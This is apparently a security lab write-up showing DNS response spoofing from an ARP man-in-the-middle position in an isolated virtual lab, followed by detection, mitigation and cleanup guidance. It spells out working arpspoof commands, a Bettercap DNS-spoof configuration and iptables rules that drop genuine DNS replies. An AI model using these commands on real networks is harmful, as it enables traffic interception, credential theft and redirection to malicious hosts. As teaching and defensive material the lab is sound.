---
title: "DNS SPOOFING VIA ARP-BASED MITM"
date: 2026-02-02
layout: single
lang: en
translation_key: dns-spoofing
categories: [Labs]
tags: [DNS, Spoofing, ARP, MITM, Bettercap, Wireshark]
excerpt: "Demonstration of DNS response spoofing from an ARP-based man-in-the-middle position in a controlled Proxmox lab."
permalink: /labs/dns-spoofing/
header:
  teaser: /assets/images/DOOR-AJAR.jpg
  image: /assets/images/DOOR-AJAR.jpg
  overlay_filter: 0.3
  overlay_image: /assets/images/DOOR-AJAR.jpg
  image_description: "A small crack in trust can open the door to deception — DNS spoofing in action."
  image_height: 300px
author_profile: true
---

<em>
<strong>Important:</strong> This technique is presented for educational purposes only. It was executed in a private, controlled lab environment. Performing DNS or ARP spoofing on a network without explicit authorization is illegal and unethical.
</em>

### Overview

---

This project demonstrates **DNS response spoofing from an ARP-based man-in-the-middle position**.

The attacker first uses ARP spoofing to place a Kali Linux machine between a Windows victim and its local DNS server. Kali then intercepts DNS queries, injects forged responses that map a legitimate hostname to an attacker-controlled address, and blocks the legitimate DNS server’s replies.

The purpose of the lab is to demonstrate:

1. Normal DNS resolution before the attack.
2. The establishment of an ARP-based MITM position.
3. The injection of forged DNS responses.
4. The network and host artifacts available to defenders.
5. Detection, mitigation, and cleanup procedures.

All tests were performed inside a **Proxmox lab** using systems connected to the same isolated virtual network.

> This lab builds on the ARP spoofing project, which explains in greater detail how the attacker obtained the Layer 2 man-in-the-middle position used here.
>
> [Read the ARP Spoofing lab](/labs/arp-spoofing/){: target="\_blank" rel="noopener noreferrer" }

### Lab Setup

---

| Role                 | Hostname          | Description                                                |
| -------------------- | ----------------- | ---------------------------------------------------------- |
| **WINDOWS10_VICTIM** | Test target       | Windows 10 client performing DNS lookups                   |
| **KALI_ATTACKER**    | Attacker machine  | Runs ARP spoofing, Bettercap, iptables, and packet capture |
| **DNS_SERVER**       | Raspberry Pi      | Local DNS resolver running `dnsmasq`                       |
| **UBUNTU_SERVER**    | Legitimate server | Hosts the legitimate `portal.company.local` service        |

**OPSEC placeholders**

The following labels replace the real addresses used in the lab:

- `WINDOWS10_VICTIM_IP`
- `KALI_ATTACKER_IP`
- `DNS_SERVER_IP`
- `UBUNTU_SERVER_IP`

### What Is DNS Spoofing?

---

DNS spoofing is an attack in which an adversary sends a forged DNS response so that a domain name resolves to an incorrect or attacker-controlled IP address.

In this lab, the legitimate hostname:

```text
portal.company.local
```

should resolve to the Ubuntu server. During the attack, Kali returns a forged answer that points the hostname to the attacker instead.

DNS spoofing is sometimes broadly called **DNS poisoning**. However, the more precise term for this lab is DNS response spoofing because the attacker injects a forged response in transit. The Raspberry Pi resolver’s cache is not directly modified.

The attack chain is:

```text
ARP spoofing
      ↓
Kali obtains a MITM position
      ↓
Victim sends a DNS query
      ↓
Kali injects a forged DNS response
      ↓
Legitimate DNS response is blocked
      ↓
Victim resolves the hostname to the attacker
```

**Potential attacker goals**

A successful redirection could be used to:

- Serve a fake or malicious website.
- Capture credentials entered into an imitation login page.
- Redirect users to malware-hosting infrastructure.
- Inject or modify unencrypted content.
- Monitor or disrupt communication.
- Support additional man-in-the-middle activity.

Encryption and certificate validation can significantly reduce the usefulness of this attack. For example, HTTPS should generate certificate warnings when the attacker cannot present a valid certificate for the legitimate hostname.

### Prerequisites

---

Before running the test:

1. Configure the Raspberry Pi or Linux system as the local DNS resolver.
2. Configure the Windows victim to use only `DNS_SERVER_IP` for DNS.
3. Host the legitimate service on `UBUNTU_SERVER`.
4. Add the hostname mapping to the Raspberry Pi’s `dnsmasq` configuration.
5. Confirm that all systems are connected to the isolated Proxmox lab network.

On the Windows victim, verify the DNS configuration:

```powershell
ipconfig /all
```

The **DNS Servers** field should show only the Raspberry Pi address.

### Baseline A — Normal DNS Resolution

---

Before performing the attack, I documented the normal communication flow.

The hostname `portal.company.local` was configured in `dnsmasq` on the Raspberry Pi to resolve to `UBUNTU_SERVER_IP`.

![Baseline A — dnsmasq configuration](/assets/images/dns-poisoning/RASPBERRY_PI_DNSMASQ.CONF_BASE_A.png)

On `WINDOWS10_VICTIM`, I queried the hostname:

```powershell
nslookup portal.company.local
```

The response returned the legitimate Ubuntu server address.

![Baseline A — legitimate nslookup response](/assets/images/dns-poisoning/BASE_A_NSLOOKUP_W10_TO_UBUNTU_BASE_A.png)

This established the expected baseline:

```text
portal.company.local → UBUNTU_SERVER_IP
```

The baseline is important because it provides a known-good result to compare against the forged response observed during the attack.

### Baseline B — DNS Spoofing via ARP-Based MITM

---

**Step 1 — Establish the MITM position**

Kali must first become an intermediary between the Windows victim and the DNS server.

The following commands poison both endpoints’ ARP caches:

```bash
sudo arpspoof -i eth0 -t WINDOWS10_VICTIM_IP DNS_SERVER_IP
```

```bash
sudo arpspoof -i eth0 -t DNS_SERVER_IP WINDOWS10_VICTIM_IP
```

The first command tells the Windows victim that the DNS server’s IP address is associated with Kali’s MAC address.

The second command tells the DNS server that the victim’s IP address is associated with Kali’s MAC address.

The resulting path becomes:

```text
WINDOWS10_VICTIM
        ↓
KALI_ATTACKER
        ↓
DNS_SERVER
```

instead of:

```text
WINDOWS10_VICTIM
        ↓
DNS_SERVER
```

On Windows, the ARP table can be inspected with:

```powershell
arp -a
```

The DNS server’s IP address appeared associated with the attacker’s MAC address, confirming that the victim’s ARP cache had been poisoned.

![Baseline B — poisoned Windows ARP table](/assets/images/dns-poisoning/ARP_TABLE_WINDOWS10_ARP_SPOOF_BASE_B.png)

This ARP change establishes the interception position. It does not yet alter DNS resolution by itself.

**Step 2 — Configure Bettercap DNS spoofing**

Bettercap was then configured to answer queries for:

```text
portal.company.local
```

with the Kali attacker’s IP address.

```bash
sudo bettercap -iface eth0 -eval "
set dns.spoof.domains portal.company.local;
set dns.spoof.address KALI_ATTACKER_IP;
set dns.spoof.all true;
dns.spoof on;
events.stream on;"
```

Because ARP spoofing was already running through `arpspoof`, Bettercap was used primarily for the forged DNS response.

Bettercap can also provide ARP spoofing functionality through options such as:

```text
set arp.spoof.targets WINDOWS10_VICTIM_IP,DNS_SERVER_IP
set arp.spoof.fullduplex true
arp.spoof on
```

However, this configuration did not operate reliably in my lab. I therefore performed the ARP spoofing separately with `arpspoof`.

At this stage, Kali could observe the victim’s DNS query and inject a response mapping the legitimate hostname to `KALI_ATTACKER_IP`.

**Step 3 — Block the legitimate DNS response**

The legitimate DNS server could still send its own response. This could produce competing answers and make the result inconsistent.

To ensure that only the forged response reached the Windows victim, I added temporary forwarding rules on Kali:

```bash
sudo iptables -I FORWARD \
  -p udp \
  -s DNS_SERVER_IP \
  --sport 53 \
  -d WINDOWS10_VICTIM_IP \
  -j DROP
```

```bash
sudo iptables -I FORWARD \
  -p tcp \
  -s DNS_SERVER_IP \
  --sport 53 \
  -d WINDOWS10_VICTIM_IP \
  -j DROP
```

These rules block DNS responses from the legitimate resolver to the victim over UDP and TCP port 53.

The resulting flow is:

```text
Victim DNS query
      ↓
Kali observes the query
      ↓
Kali sends a forged response
      ↓
Legitimate resolver response is dropped
      ↓
Victim accepts the attacker-controlled answer
```

### Attack Result

---

On `WINDOWS10_VICTIM`, I repeated the lookup:

```powershell
nslookup portal.company.local
```

The hostname no longer resolved to the legitimate Ubuntu server. Instead, the response pointed to the attacker-controlled address.

![Baseline B — forged nslookup response](/assets/images/dns-poisoning/NSLOOKUP_W10_BASE_B.png)

The important comparison is:

```text
Before the attack:
portal.company.local → UBUNTU_SERVER_IP

During the attack:
portal.company.local → KALI_ATTACKER_IP
```

This difference confirms that the victim accepted a forged DNS response.

### Packet-Capture Evidence

---

**Forged DNS response**

The Wireshark capture on Kali shows DNS traffic related to the victim’s query for `portal.company.local`.

![Wireshark — forged DNS response](/assets/images/dns-poisoning/WIRESHARK_KALI_DNS_BASEB.png)

Relevant details for analysis include:

- The queried hostname.
- The DNS transaction ID.
- The source of the DNS response.
- The returned IP address.
- Whether multiple responses exist for the same query.
- The timing between the forged and legitimate responses.

A useful Wireshark display filter is:

```text
dns.qry.name == "portal.company.local"
```

Defenders could compare the returned address with:

- The expected internal DNS record.
- Responses from another trusted resolver.
- Previous known-good packet captures.
- DNS server logs.
- Endpoint DNS cache entries.

**ICMP redirects observed during the test**

ICMP redirect traffic was also observed in the packet capture:

![Wireshark — ICMP redirects](/assets/images/dns-poisoning/WIRESHARK_KALI_BASE_B.png)

ICMP redirects are normally sent by routers to tell a host that a more appropriate route exists. Redirect messages originating from an unexpected endpoint or non-router device can indicate abnormal routing behavior or misconfiguration.

In this lab, the ICMP redirect traffic should be treated as a supporting network anomaly rather than proof of DNS spoofing by itself.

A defender should correlate it with stronger evidence, including:

- Unexpected ARP table changes.
- Duplicate IP-to-MAC associations.
- Forged DNS responses.
- DNS answers that differ from the trusted resolver.
- Traffic unexpectedly passing through another endpoint.
- An unusual host sending ICMP Type 5 messages.

### Detection Opportunities

---

**ARP-layer indicators**

- The DNS server’s IP suddenly maps to a different MAC address.
- The same MAC address appears for multiple IP addresses.
- ARP mappings change repeatedly within a short period.
- A non-gateway system sends an unusual number of ARP replies.
- The victim and DNS server both associate each other’s IP with the attacker’s MAC.

**DNS-layer indicators**

- A hostname resolves to an unexpected IP address.
- Different resolvers return conflicting answers.
- Multiple DNS responses appear for the same query.
- DNS replies arrive from an unexpected source.
- The returned TTL or response structure differs from the established baseline.
- Internal services unexpectedly resolve to user workstations or unknown hosts.

**Network indicators**

- DNS traffic traverses an endpoint that is not a router or approved security device.
- A host unexpectedly generates ICMP redirect messages.
- DNS replies from the legitimate resolver are missing or dropped.
- Unusual forwarding or firewall behavior appears on an endpoint.
- A sudden increase in ARP, DNS, or ICMP anomalies occurs on the same network segment.

**Endpoint indicators**

- Browser certificate warnings appear when users visit a familiar hostname.
- Users are redirected to unfamiliar pages.
- The local DNS cache contains unexpected addresses.
- Security tools detect changes to ARP mappings.
- Applications connect to an IP address that does not match the expected service.

### Mitigation

---

Effective protection requires controls at multiple layers.

**DHCP snooping**

DHCP snooping creates a trusted table that associates:

- IP address
- MAC address
- VLAN
- Switch port
- DHCP lease

This table can be used by Dynamic ARP Inspection to determine whether an ARP message is legitimate.

**Dynamic ARP Inspection**

Dynamic ARP Inspection validates ARP packets against trusted IP-to-MAC mappings and can drop forged ARP replies before they reach endpoints.

DAI is one of the most direct protections against the ARP stage of this attack.

**Port security**

Port security limits which MAC addresses are allowed to use each managed-switch port.

This reduces the ability of unauthorized devices to connect to the network, although it does not necessarily stop an attack launched from an already authorized endpoint.

**VLANs and firewall rules**

VLANs separate devices into different Layer 2 broadcast domains, limiting how far ARP spoofing can reach.

Firewall rules and ACLs should then control communication between VLANs.

VLANs alone do not prevent spoofing between systems located inside the same VLAN.

**DNSSEC**

DNSSEC allows resolvers to validate cryptographic signatures associated with DNS records.

A forged response that fails DNSSEC validation can be rejected by a validating resolver.

DNSSEC protection depends on:

- The DNS zone being signed.
- The resolver performing validation.
- The complete trust chain being configured correctly.

**DNS over HTTPS and DNS over TLS**

DoH and DoT encrypt DNS traffic between the client and a trusted resolver.

This makes it more difficult for an attacker on the local network to read or modify DNS requests and responses in transit.

However, these protocols must be configured to use an approved and trusted resolver.

**HTTPS and HSTS**

HTTPS does not prevent DNS spoofing, but it reduces the usefulness of redirection.

An attacker who redirects a user to a fake server must still present a valid TLS certificate for the legitimate hostname. Otherwise, the browser should display a certificate warning.

HSTS further helps by preventing browsers from silently downgrading a site from HTTPS to HTTP.

**ARP and DNS monitoring**

Monitoring tools can detect:

- Unexpected IP-to-MAC mapping changes.
- Conflicting DNS answers.
- Duplicate DNS responses.
- DNS replies from unauthorized sources.
- Unusual ICMP redirect activity.

Potential tools and data sources include:

- Arpwatch
- Suricata
- Snort
- Zeek
- Wireshark
- Switch security logs
- DNS resolver logs
- Firewall logs
- SIEM correlation rules

### Defense in Depth

---

The mitigations are most effective when combined:

```text
DHCP snooping establishes trusted IP-to-MAC mappings
      ↓
Dynamic ARP Inspection blocks forged ARP messages
      ↓
Port security limits unauthorized devices
      ↓
VLANs and firewall rules restrict the attack scope
      ↓
DNSSEC or encrypted DNS protects DNS integrity
      ↓
HTTPS and SSH protect application data
      ↓
Monitoring detects suspicious behavior
```

No single control completely eliminates the risk.

The ARP protections attempt to prevent the attacker from gaining a MITM position. Segmentation limits the affected area. DNS protections defend the resolution process. Application encryption protects content even if interception occurs. Monitoring provides visibility when preventive controls fail.

### Immediate Response

---

When DNS or ARP spoofing is suspected:

1. Disconnect or isolate the suspected attacker.
2. Record the current ARP tables before clearing them.
3. Capture relevant DNS and ARP traffic.
4. Compare DNS answers with a trusted resolver.
5. Review DHCP, switch, firewall, and DNS server logs.
6. Flush affected ARP and DNS caches.
7. Verify that no unauthorized network configuration remains.
8. Reset credentials if users entered them into a redirected service.
9. Investigate certificate warnings and suspicious destinations.
10. Continue monitoring for recurring ARP or DNS anomalies.

### Cleanup

---

After completing the authorized test, I removed the temporary network changes.

**Kali attacker**

Delete the UDP DNS blocking rule:

```bash
sudo iptables -D FORWARD \
  -p udp \
  -s DNS_SERVER_IP \
  --sport 53 \
  -d WINDOWS10_VICTIM_IP \
  -j DROP
```

Delete the TCP DNS blocking rule:

```bash
sudo iptables -D FORWARD \
  -p tcp \
  -s DNS_SERVER_IP \
  --sport 53 \
  -d WINDOWS10_VICTIM_IP \
  -j DROP
```

Stop Bettercap and the ARP spoofing processes:

```bash
sudo pkill bettercap
sudo pkill arpspoof
```

**Windows victim**

Flush the DNS cache:

```powershell
ipconfig /flushdns
```

Restore DHCP-provided DNS configuration when appropriate:

```powershell
netsh interface ip set dns "Ethernet" dhcp
```

Then verify resolution:

```powershell
nslookup portal.company.local
```

**Raspberry Pi DNS server**

Restart `dnsmasq`:

```bash
sudo systemctl restart dnsmasq
```

After cleanup, the expected result should be restored:

```text
portal.company.local → UBUNTU_SERVER_IP
```

### Key Findings

---

This lab demonstrated that:

- ARP spoofing can create a man-in-the-middle position inside a local Layer 2 network.
- DNS queries using unencrypted UDP or TCP port 53 can be observed and manipulated from that position.
- A forged DNS response can redirect a victim to an attacker-controlled address.
- Blocking the legitimate response makes the forged answer more reliable.
- ARP tables, DNS responses, packet captures, and routing anomalies provide useful defensive evidence.
- Encryption and certificate validation can reduce the impact even when redirection succeeds.
- Layer 2 controls, DNS validation, segmentation, encryption, and monitoring should be combined as defense in depth.

**Conclusion**

This project demonstrated **DNS response spoofing through an ARP-based man-in-the-middle attack** in a controlled Proxmox environment.

The attack did not modify the Raspberry Pi resolver’s cache. Instead, Kali intercepted the victim’s DNS traffic, injected a forged answer, and prevented the legitimate resolver’s response from reaching the victim. For that reason, **DNS spoofing** is the most precise description of the technique demonstrated.

From a defensive perspective, the lab shows why DNS events should not be investigated in isolation. Unexpected DNS answers may be connected to Layer 2 manipulation, changes in ARP mappings, suspicious packet forwarding, or traffic originating from an unauthorized intermediary.

The strongest mitigation is a layered approach combining:

- DHCP snooping
- Dynamic ARP Inspection
- Port security
- VLAN segmentation
- Firewall rules
- DNSSEC or encrypted DNS
- HTTPS and other authenticated encryption
- Continuous ARP, DNS, and network monitoring
